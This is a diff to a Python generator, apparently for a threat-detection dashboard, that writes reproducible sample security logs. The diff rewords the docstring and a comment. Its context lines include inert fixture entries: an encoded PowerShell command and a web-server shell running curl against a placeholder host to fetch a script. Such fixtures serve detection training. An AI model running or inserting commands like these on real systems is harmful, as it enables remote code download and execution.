@@ -1,8 +1,6 @@
-"""Generate reproducible sample logs (auth / firewall / web / process) with embedded events.
-
-Run `python -m threatscope.gen_data` to (re)write the bundled sample logs under
-threatscope/data/. The attacks are deterministic so the dashboard always shows the
-same incidents; benign noise surrounds them.
+"""Make the same sample login, firewall, web, and process logs each time. Run python -m
+threatscope.gen_data to write them to threatscope/data/. Known attack events are mixed with
+normal sample activity.
 """
 
 from __future__ import annotations
@@ -72,7 +70,7 @@ def gen_process(rng):
             "node": "node worker.js", "nginx": "nginx -g daemon off;",
         }[process]
         lines.append(f'{_ts(rng.randint(0, 7200))} host={host} user={user} parent={parent} process={process} command="{command}"')
-    # Deliberate, inert strings in the generated teaching fixture.
+    # These are harmless sample strings for the training data.
     lines.extend([
         f'{_ts(6100)} host=workstation-01 user=alice parent=bash process=powershell command="powershell -EncodedCommand RkFLRV9TQU1QTEU="',
         f'{_ts(6120)} host=web-01 user=www-data parent=nginx process=sh command="sh -c curl http://example.invalid/demo.sh"',
